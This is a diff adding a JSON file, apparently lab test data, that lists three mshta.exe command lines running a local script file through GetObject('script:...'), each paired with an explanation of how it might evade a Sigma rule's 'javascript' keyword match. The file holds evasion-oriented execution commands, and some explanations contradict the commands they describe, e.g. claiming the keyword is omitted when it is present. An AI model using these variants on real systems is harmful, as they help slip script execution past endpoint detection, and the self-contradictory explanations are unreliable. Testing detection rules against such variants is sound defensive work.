@@ -1,0 +1,14 @@
+[
+  {
+    "output": "mshta.exe \"javascript:a=(GetObject('script:C:\\Lab\\input\\sample.txt')).Exec();close();\"",
+    "explanation": "Insertion of quotes and substitution of the URL with a local file path to avoid detection by the 'javascript' keyword match."
+  },
+  {
+    "output": "mshta.exe -javascript:a=(GetObject('script:C:\\Lab\\input\\sample.txt')).Exec();close();",
+    "explanation": "Substitution of the command-line argument syntax to use a different format that may not trigger the 'javascript' keyword match."
+  },
+  {
+    "output": "mshta.exe javascript:a=(GetObject('script:C:\\Lab\\input\\sample.txt')).Exec();close();",
+    "explanation": "Omission of the 'javascript' keyword by using a local file path, which may not be flagged by the Sigma rule as the suspicious indicator is not present."
+  }
+]
